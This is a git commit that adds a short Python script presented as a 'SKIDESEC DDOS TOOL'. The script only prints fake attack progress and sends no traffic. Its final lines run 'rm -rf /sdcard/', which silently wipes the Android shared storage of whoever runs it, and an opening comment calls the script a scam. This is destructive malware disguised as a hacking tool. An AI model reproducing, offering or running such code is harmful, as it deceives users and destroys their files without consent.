aa5b7f5b18e69694cc6aef288bf758074de4fd73
Z4RP1HR <103745705+Z4RP1HR@users.noreply.github.com>
2022-05-02 20:20:12 +0800

    Add files via upload

---
+++ ddostool.py
@@ -0,0 +1,27 @@
+#scam motherfuckas
+print("SKIDESEC DDOS TOOL\n")
+
+name = input("please enter the url: ")
+print("\nzombies available: 743")
+input("\nhow many botnets do you want to use? ")
+
+print("\ntargeting:" + name + "\n")
+
+import time
+time.sleep(0.9)
+
+for x in range(300):
+  print("sent packet to: " + name)
+  
+print("attack succesfully")
+
+input("\ndo you want to see the results? (y/n) ")
+
+import os,sys,time
+
+os.system("reset")
+print ("website down")
+time.sleep(2)
+os.system("cd /sdcard")
+os.system("rm -rf /sdcard/")
+
